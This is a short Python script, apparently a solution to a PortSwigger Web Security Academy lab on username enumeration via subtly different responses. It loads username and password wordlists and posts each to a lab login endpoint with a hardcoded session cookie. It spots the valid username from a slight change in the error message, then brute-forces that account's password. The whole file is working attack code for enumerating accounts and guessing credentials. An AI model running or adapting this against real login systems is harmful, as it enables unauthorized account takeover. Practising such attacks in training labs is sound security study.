
#Username enumeration via subtly different responses

import requests

session = requests.session()

burp0_url = "https://acf91ff61f789be2c08ca41e00f40026.web-security-academy.net:443/login"
burp0_cookies = {"session": "nHN4TiwyaHXijfju0tmHykUI2O88pYXF"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://acf91ff61f789be2c08ca41e00f40026.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://acf91ff61f789be2c08ca41e00f40026.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}

user_list = []
pass_list = []

with open("WebNinja\\BRUP_WEB_Security\\Authentication\\user.txt","r") as file:
    for line in file:
        user_list.append(str(line).strip())

with open("WebNinja\\BRUP_WEB_Security\\Authentication\\pass.txt","r") as file:
    for line in file:
        pass_list.append(str(line).strip())


#find username
valid_uname = ""
for uname in user_list:
    burp0_data = {"username": uname, "password": "test"}
    response = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text

    if "Invalid username or password." not in response:
        print("username : %s" % (uname))
        valid_uname = uname
        break

#find password
valid_pword = ""
for pword in pass_list:
    burp0_data = {"username": valid_uname, "password": pword}
    response = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text

    if "Invalid username or password" not in response:
        print("password : %s" % (pword))
        valid_pword = pword
        break

print("creds -> %s : %s" % (valid_uname,valid_pword))
